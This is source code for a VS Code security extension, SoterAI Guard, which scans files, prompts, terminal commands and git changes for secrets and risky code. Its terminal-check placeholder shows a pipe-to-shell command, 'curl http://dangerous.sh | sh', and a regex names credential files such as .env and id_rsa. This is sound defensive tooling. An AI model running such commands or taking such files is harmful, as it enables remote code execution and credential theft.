import * as vscode from "vscode";
import * as path from "path";
import { execFile } from "child_process";
import { promisify } from "util";
import { ExtensionState } from "./state";
import { TelemetryManager } from "./telemetry";
import { DashboardPanel } from "./webview/DashboardPanel";
import { redactForSharing, type Finding } from "@soterai/guard-core";
import { escapeHtml, getNonce } from "./firewall/util";

const execFileAsync = promisify(execFile);

const diagnosticsCollection = vscode.languages.createDiagnosticCollection("soterai-guard");

export function registerCommands(context: vscode.ExtensionContext, refreshViews: () => void): void {
    const state = ExtensionState.getInstance();
    const telemetry = TelemetryManager.getInstance();

    const scanFileHandler = async (uri?: vscode.Uri) => {
        let targetUri = uri;
        if (!targetUri && vscode.window.activeTextEditor) {
            targetUri = vscode.window.activeTextEditor.document.uri;
        }
        if (!targetUri) {
            vscode.window.showErrorMessage("No file open to scan.");
            return;
        }

        try {
            const doc = await vscode.workspace.openTextDocument(targetUri);
            const text = doc.getText();
            const relativePath = vscode.workspace.asRelativePath(targetUri);

            // Check max file size
            const maxKb = vscode.workspace.getConfiguration("soterai").get<number>("scan.maxFileSizeKb", 256);
            if (text.length > maxKb * 1024) {
                vscode.window.showWarningMessage(`File exceeds ${maxKb}KB size threshold. Scan skipped.`);
                return;
            }

            // Run DecisionEngine
            const decision = await state.engine.scan(text, { context: "file" });
            state.latestDecision = decision;
            state.setScannedFile(targetUri.fsPath, decision);

            telemetry.trackDetection(decision, text.length, "file");
            refreshViews();

            // Show Problems diagnostics
            updateDiagnostics(doc, decision.findings);

            // Handle decision action notifications
            if (decision.decision === "block") {
                vscode.window.showErrorMessage(`[SoterAI BLOCK] File ${relativePath} contains high-risk content! Decision: Block.`);
            } else if (decision.decision === "warn") {
                vscode.window.showWarningMessage(`[SoterAI WARNING] File ${relativePath} has findings. Risk Score: ${decision.riskScore}.`);
            } else if (decision.decision === "redact") {
                vscode.window.showInformationMessage(`[SoterAI REDACT] File ${relativePath} scanned. Safeguards active.`);
            } else {
                vscode.window.showInformationMessage(`[SoterAI ALLOW] File ${relativePath} is safe. No critical issues.`);
            }
        } catch (err: any) {
            vscode.window.showErrorMessage(`Scanning failed: ${err.message}`);
        }
    };

    const scanSelectionHandler = async () => {
        const editor = vscode.window.activeTextEditor;
        if (!editor) {
            vscode.window.showErrorMessage("No active text selection.");
            return;
        }
        const selectionText = editor.document.getText(editor.selection);
        if (!selectionText) {
            vscode.window.showErrorMessage("Selection is empty.");
            return;
        }

        const decision = await state.engine.scan(selectionText, { context: "selection" });
        state.latestDecision = decision;
        telemetry.trackDetection(decision, selectionText.length, "selection");
        refreshViews();

        if (decision.decision === "block") {
            vscode.window.showErrorMessage(`[SoterAI BLOCK] Selection risk score is ${decision.riskScore}! Block sending to AI.`);
        } else if (decision.decision === "redact" && decision.redactedText) {
            const copyVal = await vscode.window.showInformationMessage(
                "Sensitive data detected. Would you like to copy a redacted version to clipboard?",
                "Copy Redacted"
            );
            if (copyVal === "Copy Redacted") {
                await vscode.env.clipboard.writeText(decision.redactedText);
                vscode.window.showInformationMessage("Redacted selection copied to clipboard.");
            }
        } else {
            vscode.window.showInformationMessage(`Selection safe. Risk score: ${decision.riskScore}/100.`);
        }
    };

    const redactSelectionForAIHandler = async () => {
        const editor = vscode.window.activeTextEditor;
        if (!editor) return;
        const text = editor.document.getText(editor.selection);
        if (!text) return;

        const decision = await state.engine.scan(text, { context: "selection" });
        if (decision.redactedText) {
            // decision.redactedText is already fail-closed safe (redactForSharing).
            await vscode.env.clipboard.writeText(decision.redactedText);
            vscode.window.showInformationMessage("Selected text redacted and copied to your clipboard.");
        } else {
            // No findings, but still run the safety net before anything hits the clipboard.
            await vscode.env.clipboard.writeText(redactForSharing(text));
            vscode.window.showInformationMessage("No sensitive data found. Selection copied to clipboard.");
        }
    };

    const scanWorkspaceRiskHandler = async () => {
        const config = vscode.workspace.getConfiguration("soterai");
        const maxFiles = config.get<number>("scan.maxWorkspaceFiles", 1000);
        const maxKb = config.get<number>("scan.maxFileSizeKb", 256);
        const excludeGlobs = config.get<string[]>("scan.excludeGlobs", []);

        vscode.window.withProgress({
            location: vscode.ProgressLocation.Notification,
            title: "SoterAI: Scanning Workspace Risks...",
            cancellable: true
        }, async (progress, token) => {
            const files = await vscode.workspace.findFiles("**/*", `{${excludeGlobs.join(",")}}`, maxFiles);
            let scanned = 0;
            let totalRisk = 0;
            const BATCH_SIZE = 8;

            for (let i = 0; i < files.length; i += BATCH_SIZE) {
                if (token.isCancellationRequested) break;
                const batch = files.slice(i, i + BATCH_SIZE);
                const results = await Promise.allSettled(
                    batch.map(async (file) => {
                        const content = await vscode.workspace.fs.readFile(file);
                        const text = new TextDecoder().decode(content);
                        if (text.length > maxKb * 1024) return null;
                        const decision = await state.engine.scan(text, { context: "workspace" });
                        state.setScannedFile(file.fsPath, decision);
                        return decision;
                    })
                );
                for (const r of results) {
                    if (r.status === "fulfilled" && r.value) {
                        totalRisk += r.value.riskScore;
                        scanned++;
                    }
                }
                progress.report({ increment: (BATCH_SIZE / files.length) * 100, message: `${scanned}/${files.length} files` });
            }

            const meanScore = scanned > 0 ? Math.round(totalRisk / scanned) : 0;
            vscode.window.showInformationMessage(`Workspace scan finished. Scanned ${scanned} files. Average Risk Score: ${meanScore}/100.`);
            refreshViews();
        });
    };

    const checkTerminalCommandHandler = async () => {
        const cmd = await vscode.window.showInputBox({
            prompt: "Enter or paste the terminal command to check",
            placeHolder: "e.g. curl http://dangerous.sh | sh"
        });
        if (!cmd) return;

        const decision = await state.engine.scan(cmd, { context: "terminal" });
        state.latestDecision = decision;
        refreshViews();

        if (decision.decision === "block" || decision.decision === "approval_required") {
            vscode.window.showErrorMessage(`[SoterAI BLOCK] Terminating command check: "${cmd}" is blocked or requires approval. Risk: ${decision.severity}`);
        } else if (decision.decision === "warn") {
            vscode.window.showWarningMessage(`[SoterAI WARNING] Command contains risky patterns: ${decision.evidencePreview}`);
        } else {
            vscode.window.showInformationMessage("Command matches safe local execution baseline.");
        }
    };

    const reviewSelectedAICodeHandler = async () => {
        const editor = vscode.window.activeTextEditor;
        if (!editor) return;
        const text = editor.document.getText(editor.selection);
        if (!text) {
            vscode.window.showErrorMessage("Please select AI generated code to review.");
            return;
        }

        const decision = await state.engine.scan(text, { context: "file" });
        const codeFindings = decision.findings.filter((f: Finding) => f.category !== "secret"); // focus on vulnerabilities

        if (!codeFindings.length) {
            vscode.window.showInformationMessage("No common security vulnerabilities detected in selected code.");
            return;
        }

        const panel = vscode.window.createWebviewPanel(
            "soteraiCodeReview",
            "SoterAI AI Code Review",
            vscode.ViewColumn.Two,
            { enableScripts: false }
        );
        const nonce = getNonce();
        // Strict CSP: no scripts, no remote resources, inline styles only.
        const csp = `default-src 'none'; style-src 'unsafe-inline'; img-src 'none'; script-src 'nonce-${nonce}';`;
        panel.webview.html = `<!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta http-equiv="Content-Security-Policy" content="${csp}">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body { font-family: var(--vscode-font-family, sans-serif); padding: 16px; color: var(--vscode-foreground); background: var(--vscode-editor-background); }
            h2 { color: var(--vscode-textLink-foreground); }
            .finding { border-bottom: 1px solid var(--vscode-panel-border); padding: 12px 0; }
            .severity { font-weight: bold; padding: 2px 6px; border-radius: 3px; display: inline-block; margin-bottom: 6px; color: white; }
            .critical, .high { background: #ef4444; }
            .medium { background: #f59e0b; }
            .low, .info { background: #3b82f6; }
          </style>
        </head>
        <body>
          <h2>🔍 AI Generated Code Review Report</h2>
          ${codeFindings.map((f: Finding) => `
            <div class="finding">
              <span class="severity ${escapeHtml(f.severity)}">${escapeHtml(f.severity.toUpperCase())}</span>
              <h3>${escapeHtml(f.title)}</h3>
              <p><strong>Reason:</strong> ${escapeHtml(f.reason)}</p>
              <p><strong>Evidence:</strong> <code>${escapeHtml(f.redactedEvidence)}</code></p>
              <p><em>Review this pattern before accepting AI-suggested code.</em></p>
            </div>
          `).join("")}
        </body>
      </html>`;
    };

    // ── Configure Policy: local/team/enterprise mode, thresholds, cloud, telemetry ──
    const configurePolicyHandler = async () => {
        const config = vscode.workspace.getConfiguration("soterai");
        const trusted = vscode.workspace.isTrusted;

        const pick = await vscode.window.showQuickPick(
            [
                { label: "$(shield) Policy Mode", detail: `Current: ${config.get("policy.mode", "local")}`, id: "mode" },
                { label: "$(cloud) Cloud Features", detail: `Current: ${config.get("cloud.enabled", false) ? "enabled" : "disabled"}${trusted ? "" : " — requires a trusted workspace"}`, id: "cloud" },
                { label: "$(broadcast) Telemetry", detail: `Current: ${config.get("telemetry.redactedEvents", "off")}`, id: "telemetry" },
                { label: "$(arrow-up) Remote Escalation", detail: `Current: ${config.get("scan.remoteEscalation", "never")}`, id: "escalation" },
                { label: "$(gear) Open Settings UI", detail: "Edit all SoterAI settings in the Settings editor", id: "settings" },
            ],
            { title: "SoterAI: Configure Policy", placeHolder: "Choose a policy setting to change" }
        );
        if (!pick) return;

        const setGlobal = (key: string, value: unknown) =>
            config.update(key, value, vscode.ConfigurationTarget.Global);

        switch ((pick as any).id) {
            case "mode": {
                const mode = await vscode.window.showQuickPick(["local", "team", "enterprise"], { title: "Policy Mode", placeHolder: "Select policy mode" });
                if (mode) { await setGlobal("policy.mode", mode); vscode.window.showInformationMessage(`SoterAI policy mode set to ${mode}.`); }
                break;
            }
            case "cloud": {
                if (!trusted) {
                    vscode.window.showWarningMessage("Cloud features are disabled in restricted (untrusted) workspaces. Trust this workspace to enable them.");
                    break;
                }
                const choice = await vscode.window.showQuickPick(["enabled", "disabled"], { title: "Cloud Features" });
                if (choice) { await setGlobal("cloud.enabled", choice === "enabled"); vscode.window.showInformationMessage(`SoterAI cloud features ${choice}.`); }
                break;
            }
            case "telemetry": {
                const level = await vscode.window.showQuickPick(["off", "high-risk-only", "batched"], { title: "Redacted Telemetry" });
                if (level) { await setGlobal("telemetry.redactedEvents", level); vscode.window.showInformationMessage(`SoterAI telemetry set to ${level}.`); }
                break;
            }
            case "escalation": {
                if (!trusted) {
                    vscode.window.showWarningMessage("Remote escalation is disabled in restricted workspaces.");
                    break;
                }
                const level = await vscode.window.showQuickPick(["never", "high-risk-only", "enterprise-required"], { title: "Remote Escalation" });
                if (level) { await setGlobal("scan.remoteEscalation", level); vscode.window.showInformationMessage(`SoterAI remote escalation set to ${level}.`); }
                break;
            }
            case "settings":
                await vscode.commands.executeCommand("workbench.action.openSettings", "soterai");
                break;
        }
        refreshViews();
    };

    // ── Scan Before AI Prompt: paste a prompt, scan locally, get safe version ──
    const scanBeforeAIPromptHandler = async () => {
        const prompt = await vscode.window.showInputBox({
            title: "SoterAI: Scan Before AI Prompt",
            prompt: "Paste the prompt you are about to send to an AI assistant. It is scanned locally — nothing leaves your machine.",
            placeHolder: "e.g. Fix this bug. Here is my config: DATABASE_URL=postgres://...",
            ignoreFocusOut: true,
        });
        if (!prompt) return;

        const decision = await state.engine.scan(prompt, { context: "prompt" });
        state.latestDecision = decision;
        telemetry.trackDetection(decision, prompt.length, "prompt");
        refreshViews();

        if (decision.decision === "block" || decision.decision === "approval_required") {
            vscode.window.showErrorMessage(`[SoterAI BLOCK] This prompt is high-risk (score ${decision.riskScore}). Do not send it as-is: ${decision.evidencePreview ?? ""}`);
            return;
        }

        if (decision.redactedText) {
            // redactedText is already fail-closed safe; guard once more defensively.
            const safe = redactForSharing(decision.redactedText);
            const action = await vscode.window.showWarningMessage(
                `[SoterAI REDACT] Sensitive data found in your prompt (score ${decision.riskScore}). A safe, redacted version can be copied to your clipboard.`,
                "Copy Safe Prompt"
            );
            if (action === "Copy Safe Prompt") {
                await vscode.env.clipboard.writeText(safe);
                vscode.window.showInformationMessage("Redacted prompt copied. Paste this into your AI assistant.");
            }
        } else {
            const action = await vscode.window.showInformationMessage(
                `[SoterAI ALLOW] No sensitive data detected (score ${decision.riskScore}). Safe to send.`,
                "Copy Prompt"
            );
            if (action === "Copy Prompt") {
                // Safety net still runs before anything reaches the clipboard.
                await vscode.env.clipboard.writeText(redactForSharing(prompt));
            }
        }
    };

    // ── Scan Git Changes: scan the working/staged diff for secrets & risky files ──
    const scanGitChangesHandler = async () => {
        const folder = vscode.workspace.workspaceFolders?.[0];
        if (!folder) {
            vscode.window.showErrorMessage("No workspace folder open to scan git changes.");
            return;
        }
        const cwd = folder.uri.fsPath;

        let diff = "";
        try {
            // Include staged + unstaged changes plus the list of changed files.
            const [{ stdout: unstaged }, { stdout: staged }, { stdout: nameOnly }] = await Promise.all([
                execFileAsync("git", ["diff"], { cwd, maxBuffer: 20 * 1024 * 1024 }),
                execFileAsync("git", ["diff", "--staged"], { cwd, maxBuffer: 20 * 1024 * 1024 }),
                execFileAsync("git", ["diff", "--name-only", "HEAD"], { cwd, maxBuffer: 4 * 1024 * 1024 }).catch(() => ({ stdout: "" })),
            ]);
            diff = `${staged}\n${unstaged}`;
            const changedFiles = nameOnly.split("\n").map((s) => s.trim()).filter(Boolean);
            const sensitiveFiles = changedFiles.filter((f) =>
                /(^|\/)\.env(\.|$)|\.pem$|\.key$|id_rsa|credentials|secrets?\.(ya?ml|json)|\.pfx$/i.test(f)
            );
            if (sensitiveFiles.length) {
                vscode.window.showWarningMessage(`[SoterAI] Sensitive files in your changes: ${sensitiveFiles.map((f) => path.basename(f)).join(", ")}`);
            }
        } catch (err: any) {
            vscode.window.showErrorMessage(`Could not read git changes (is this a git repository?): ${err.message}`);
            return;
        }

        if (!diff.trim()) {
            vscode.window.showInformationMessage("[SoterAI] No git changes to scan.");
            return;
        }

        const decision = await state.engine.scan(diff, { context: "git" });
        state.latestDecision = decision;
        telemetry.trackDetection(decision, diff.length, "git");
        refreshViews();

        if (decision.findings.length === 0) {
            vscode.window.showInformationMessage(`[SoterAI] Git changes look clean (risk score ${decision.riskScore}/100).`);
            return;
        }

        const view = await vscode.window.showWarningMessage(
            `[SoterAI] ${decision.findings.length} finding(s) in your git changes (risk ${decision.riskScore}/100, decision: ${decision.decision.toUpperCase()}).`,
            "Show Report"
        );
        if (view === "Show Report") {
            const report = {
                scannedAt: new Date().toISOString(),
                riskScore: decision.riskScore,
                decision: decision.decision,
                categories: decision.categories,
                // Only redacted evidence — never raw diff content or secrets.
                findings: decision.findings.map((f) => ({
                    category: f.category,
                    severity: f.severity,
                    title: f.title,
                    reason: f.reason,
                    redactedEvidence: f.redactedEvidence,
                })),
            };
            const doc = await vscode.workspace.openTextDocument({ content: JSON.stringify(report, null, 2), language: "json" });
            await vscode.window.showTextDocument(doc);
        }
    };

    const connectToCloudHandler = async () => {
        // Cloud/token escalation is a trusted-workspace-only capability.
        if (!vscode.workspace.isTrusted) {
            vscode.window.showWarningMessage(
                "SoterAI cloud connection is disabled in restricted (untrusted) workspaces. Trust this workspace to connect. Local scanning continues to work."
            );
            return;
        }
        const token = await vscode.window.showInputBox({
            prompt: "Enter your SoterAI Cloud API/Connection Token",
            password: true
        });
        if (!token) return;

        await state.setCloudToken(context, token);
        await vscode.workspace.getConfiguration("soterai").update("cloud.enabled", true, vscode.ConfigurationTarget.Global);
        vscode.window.showInformationMessage("Connected to SoterAI Cloud safely. Settings synced.");
        refreshViews();
    };

    const disconnectCloudHandler = async () => {
        await state.clearCloudToken(context);
        await vscode.workspace.getConfiguration("soterai").update("cloud.enabled", false, vscode.ConfigurationTarget.Global);
        vscode.window.showInformationMessage("Disconnected. Local token deleted.");
        refreshViews();
    };

    const exportLocalRiskReportHandler = async () => {
        const reportData = {
            timestamp: new Date().toISOString(),
            policyMode: vscode.workspace.getConfiguration("soterai").get("policy.mode", "local"),
            scannedFilesCount: state.scannedFiles.size,
            scannedFiles: Array.from(state.scannedFiles.entries()).map(([filePath, dec]) => ({
                filePath: path.basename(filePath),
                riskScore: dec.riskScore,
                decision: dec.decision,
                categories: dec.categories
            }))
        };

        const doc = await vscode.workspace.openTextDocument({
            content: JSON.stringify(reportData, null, 2),
            language: "json"
        });
        await vscode.window.showTextDocument(doc);
    };

    context.subscriptions.push(
        vscode.commands.registerCommand("soterai.scanCurrentFile", scanFileHandler),
        vscode.commands.registerCommand("soterai.scanSelection", scanSelectionHandler),
        vscode.commands.registerCommand("soterai.scanWorkspaceRisk", scanWorkspaceRiskHandler),
        vscode.commands.registerCommand("soterai.redactSelectionForAI", redactSelectionForAIHandler),
        vscode.commands.registerCommand("soterai.checkTerminalCommand", checkTerminalCommandHandler),
        vscode.commands.registerCommand("soterai.reviewSelectedAICode", reviewSelectedAICodeHandler),
        vscode.commands.registerCommand("soterai.configurePolicy", configurePolicyHandler),
        vscode.commands.registerCommand("soterai.scanBeforeAIPrompt", scanBeforeAIPromptHandler),
        vscode.commands.registerCommand("soterai.scanGitChanges", scanGitChangesHandler),
        vscode.commands.registerCommand("soterai.connectToCloud", connectToCloudHandler),
        vscode.commands.registerCommand("soterai.disconnectCloud", disconnectCloudHandler),
        vscode.commands.registerCommand("soterai.exportLocalRiskReport", exportLocalRiskReportHandler),
        vscode.commands.registerCommand("soterai.openSecurityPanel", () => {
            DashboardPanel.createOrShow(context.extensionUri);
        })
    );
}

function updateDiagnostics(document: vscode.TextDocument, findings: Finding[]): void {
    const diagnostics: vscode.Diagnostic[] = [];

    for (const f of findings) {
        if (f.start !== undefined && f.end !== undefined) {
            const startPos = document.positionAt(f.start);
            const endPos = document.positionAt(f.end);
            const range = new vscode.Range(startPos, endPos);

            const severity = f.severity === "critical" || f.severity === "high"
                ? vscode.DiagnosticSeverity.Error
                : vscode.DiagnosticSeverity.Warning;

            const diagnostic = new vscode.Diagnostic(
                range,
                `[SoterAI Guard] ${f.title}: ${f.reason} (Evidence: ${f.redactedEvidence})`,
                severity
            );
            diagnostic.code = f.id;
            diagnostic.source = "SoterAI";
            diagnostics.push(diagnostic);
        }
    }

    diagnosticsCollection.set(document.uri, diagnostics);
}
